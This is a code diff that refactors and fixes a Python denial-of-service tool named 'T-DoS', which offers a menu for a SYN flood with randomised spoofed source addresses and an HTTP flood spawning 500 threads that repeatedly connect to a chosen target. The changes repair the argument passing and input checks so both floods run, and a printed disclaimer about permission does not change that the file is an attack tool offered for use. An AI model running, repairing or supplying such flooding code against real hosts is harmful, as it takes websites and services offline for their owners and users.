@@ -7,17 +7,9 @@ from concurrent.futures import thread
 import socket
 import threading
 import time
-os.system("clear")
-print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
-print("Use this tool only on your own website or websites from which you have obtained permission.")
-time.sleep(5)
-os.system("clear")
-os.system("toilet T-DoS")
-print("Coded By: ParzivalHack")
-print("Github: https://github.com/ParzivalHack")
 fake_ip = '44.197.175.168'
 attack_num = 0
-def attack():
+def attack(target, port):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
@@ -29,9 +21,9 @@ def attack():
         print(attack_num)
 
         s.close()
-for i in range(500):
-    thread = threading.Thread(target = attack)
-    thread.start()
+    for i in range(500):
+        thread = threading.Thread(target = attack)
+        thread.start()
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
@@ -70,19 +62,31 @@ def SYN_Flood(dstIP,dstPort,counter):
 
 
 def main():
-	SYN_Flood(dstIP,dstPort,int(counter))
-print("      [Menu]      ")
-print("1) SYN Flood")
-print("2) HTTP Flood")
-option = raw_input("Choose an option: ")
-if option == 1:
-	os.system("clear")
-	dstIP = str(raw_input("Target IP: "))
-	dstPort = int(input("Target Port: "))
-	counter = input("Packets to send: ")
-	main()
-elif option == 2:
-	os.system("clear")
-	target = str(input("Insert Target: "))
-	port = int(input("Insert Port: "))
-	attack()
+    os.system("clear")
+    print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
+    print("Use this tool only on your own website or websites from which you have obtained permission.")
+    time.sleep(5)
+    os.system("clear")
+    os.system("toilet T-DoS")
+    print("Coded By: ParzivalHack")
+    print("Github: https://github.com/ParzivalHack")
+    print("      [Menu]      ")
+    print("1) SYN Flood")
+    print("2) HTTP Flood")
+    option = input("Choose an option: ")
+    print(option)
+    if option == '1':
+        os.system("clear")
+        dstIP = str(input("Target IP: "))
+        dstPort = int(input("Target Port: "))
+        counter = input("Packets to send: ")
+        SYN_Flood(dstIP,dstPort,int(counter))
+    elif option == '2':
+        os.system("clear")
+        target = str(input("Insert Target: "))
+        port = int(input("Insert Port: "))
+        attack(target, port)
+
+
+if __name__ == "__main__":
+    main()
